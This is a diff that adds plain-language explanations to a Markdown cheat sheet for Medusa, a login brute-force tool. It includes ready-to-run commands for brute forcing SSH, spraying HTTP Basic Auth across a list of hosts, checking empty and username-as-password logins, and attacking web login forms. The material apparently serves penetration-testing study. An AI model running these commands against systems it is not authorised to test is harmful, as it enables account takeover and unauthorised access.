@@ -6,11 +6,12 @@
 
 ## What Is Medusa?
 
-Fast, massively parallel, modular login brute-forcer. Alternative to Hydra — same job, different syntax. Pre-installed on Kali.
+Medusa is a fast, highly parallel, modular login brute-forcer. It does the same job as Hydra but with different syntax. It comes pre-installed on Kali.
 
 ```bash
 medusa -h    # verify installed
 ```
+> Shows the Medusa help page and confirms it is installed. Run this first to see all available flags and modules.
 
 ---
 
@@ -19,6 +20,7 @@ medusa -h    # verify installed
 ```bash
 medusa [target_options] [credential_options] -M MODULE [module_options]
 ```
+> General Medusa command structure. `-M` is always required — it selects the protocol module (e.g., `ssh`, `ftp`, `web-form`). Swap the bracket groups with the appropriate flags for your target.
 
 ---
 
@@ -67,22 +69,26 @@ medusa [target_options] [credential_options] -M MODULE [module_options]
 ```bash
 medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh -f
 ```
+> Brute-forces SSH with a username and password list. `-f` stops after the first valid credential pair is found. Replace the IP and wordlist paths.
 
 ### Multiple web servers (Basic Auth)
 ```bash
 medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET -F
 ```
+> Sprays HTTP Basic Auth credentials across every host in `web_servers.txt`. `-F` stops the entire attack as soon as any host yields a valid login. Use `-f` instead if you want to continue on remaining hosts.
 
 ### Check empty passwords and user=pass
 ```bash
 medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh -f
 ```
+> Quick default-credential check before running a full wordlist. `-e ns` tries an empty password (`n`) and the username as the password (`s`) for every user — catches lazy defaults in seconds.
 
 ### Web login form
 ```bash
 medusa -M web-form -h TARGET -U users.txt -P pass.txt \
   -m "FORM:username=^USER^&password=^PASS^:F=Invalid credentials" -f
 ```
+> Brute-forces a POST login form using the `web-form` module. `^USER^` and `^PASS^` are replaced each attempt. `F=Invalid credentials` marks a failure. Replace the field names and failure string with your target's actual values.
 
 ---
 
